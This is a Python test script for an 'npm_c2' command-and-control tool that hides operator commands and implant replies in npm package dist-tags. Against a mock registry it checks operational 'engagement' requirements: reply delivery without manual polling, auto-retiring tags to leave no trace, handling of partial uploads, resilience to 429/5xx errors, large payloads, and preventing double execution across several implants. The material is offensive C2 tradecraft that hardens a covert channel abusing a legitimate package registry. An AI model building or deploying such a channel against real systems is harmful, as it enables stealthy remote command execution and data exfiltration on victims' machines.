#!/usr/bin/env python3
"""What a real engagement needs from this channel, exercised end to end.

Each check maps to one operational requirement:
  R1  a command gets a reply without a manual poll loop
  R2  tags do not accumulate on the package (auto-retire)
  R3  half-published groups are never executed and never deleted
  R4  the channel survives transient 429/5xx
  R5  long output and long commands survive intact
  R6  concurrency: two implants on one package do not double-execute
"""
import json
import os
import sys
import tempfile
import threading
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
sys.path.insert(0, os.path.dirname(__file__))

import npm_c2
import mock_registry
from npm_c2.implant import Implant
from npm_c2 import CMD_PREFIX, RES_PREFIX, encode_payload, group_chunks

FAILS = []


def step(name, ok, detail=""):
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))
    if not ok:
        FAILS.append(name)


def main():
    reg = mock_registry.Registry()
    srv, base = mock_registry.serve(reg, auth_token="npm_test")
    npm_c2.API = base + "/-/package/{}/dist-tags"
    import npm_c2.implant as im
    import npm_c2.operator as op_mod
    im.API = npm_c2.API
    op_mod.API = npm_c2.API

    from npm_c2.operator import Operator
    tmp = tempfile.mkdtemp()
    os.environ["APPDATA"] = tmp

    # ---------------------------------------------------------------- R1
    pkg = "eng/one"
    reg.tags.setdefault(pkg, {})["latest"] = "1.0.0"
    imp = Implant(pkg, token="npm_test", interval=10, jitter=0)
    op = Operator(pkg, "npm_test")
    imp._cycle()

    stop = threading.Event()

    def poller():
        while not stop.is_set():
            try:
                imp._cycle()
            except Exception:                              # noqa: BLE001
                pass
            stop.wait(0.15)

    t = threading.Thread(target=poller, daemon=True)
    t.start()
    out = op.run_command("echo r1-ok", timeout=10, interval=0.3, quiet=True)
    step("R1 run_command returns output without a manual poll",
         out is not None and "r1-ok" in out, repr(out)[:60])

    # ---------------------------------------------------------------- R2
    time.sleep(0.6)
    live_cmds = [x for x in reg.snapshot(pkg) if x.startswith(CMD_PREFIX)]
    step("R2 executed command tags are retired", live_cmds == [],
         f"{len(live_cmds)} command tag(s) left behind")

    # ---------------------------------------------------------------- R3
    pkg3 = "eng/partial"
    reg.tags.setdefault(pkg3, {})["latest"] = "1.0.0"
    imp3 = Implant(pkg3, token="npm_test")
    marker = os.path.join(tmp, "r3-marker")
    long_cmd = f"touch {marker} && echo {'A' * 500}"
    tags = encode_payload(long_cmd.encode(), CMD_PREFIX)
    for tag in tags[:-1]:                          # publish all but the last
        reg.tags[pkg3][tag] = "1.0.0"
    imp3._cycle()
    step("R3 partial group is not executed", not os.path.exists(marker))
    step("R3 partial group is not deleted either",
         len([x for x in reg.snapshot(pkg3) if x.startswith(CMD_PREFIX)]) == len(tags) - 1,
         f"{len([x for x in reg.snapshot(pkg3) if x.startswith(CMD_PREFIX)])} tag(s) kept")
    reg.tags[pkg3][tags[-1]] = "1.0.0"             # publish the rest
    imp3._cycle()
    step("R3 completed group executes once", os.path.exists(marker))
    step("R3 completed group is retired",
         not [x for x in reg.snapshot(pkg3) if x.startswith(CMD_PREFIX)])

    # ---------------------------------------------------------------- R4
    pkg4 = "eng/flaky"
    reg.tags.setdefault(pkg4, {})["latest"] = "1.0.0"
    imp4 = Implant(pkg4, token="npm_test")
    calls = {"n": 0}
    real_urlopen = im.urllib.request.urlopen

    def flaky_open(*a, **k):
        calls["n"] += 1
        if calls["n"] <= 2:
            raise im.urllib.error.URLError("temporary")
        return real_urlopen(*a, **k)

    im.urllib.request.urlopen = flaky_open
    try:
        imp4._cycle()
        survived = True
    except Exception:                                  # noqa: BLE001
        survived = False
    finally:
        im.urllib.request.urlopen = real_urlopen
    step("R4 survives two transient failures then succeeds",
         survived and calls["n"] >= 3, f"{calls['n']} attempts")

    # ---------------------------------------------------------------- R5
    pkg5 = "eng/big"
    reg.tags.setdefault(pkg5, {})["latest"] = "1.0.0"
    imp5 = Implant(pkg5, token="npm_test")
    big_cmd = "printf '%s' '" + "B" * 3000 + "'"
    out = imp5._exec(big_cmd)
    step("R5 a 3 KB command runs whole", out.count("B") == 3000,
         f"{out.count('B')} of 3000 chars")

    imp5._reply(imp5._exec("echo " + "C" * 9000))
    tags = [x for x in reg.snapshot(pkg5) if x.startswith(RES_PREFIX)]
    decoded = b"".join(b for b, ok in group_chunks(tags, RES_PREFIX) if ok)
    step("R5 a 9 KB reply reassembles from many tags",
         len(decoded) >= 9000 and decoded.count(b"C") == 9000,
         f"{len(tags)} tags, {len(decoded)} bytes")

    # ---------------------------------------------------------------- R6
    pkg6 = "eng/two"
    reg.tags.setdefault(pkg6, {})["latest"] = "1.0.0"
    a = Implant(pkg6, token="npm_test")
    b = Implant(pkg6, token="npm_test")
    a.cwd = b.cwd = tmp
    counter = os.path.join(tmp, "r6-count")
    Operator(pkg6, "npm_test").push_task(f"echo x >> {counter}")
    a._cycle()
    b._cycle()
    n = len(open(counter).read().split()) if os.path.exists(counter) else 0
    step("R6 two implants do not double-execute an unretired tag", n <= 1,
         f"executed {n} time(s)")

    stop.set()
    t.join(timeout=3)
    srv.shutdown()
    print(f"\n{'all engagement requirements met' if not FAILS else 'failing: ' + ', '.join(FAILS)}")
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
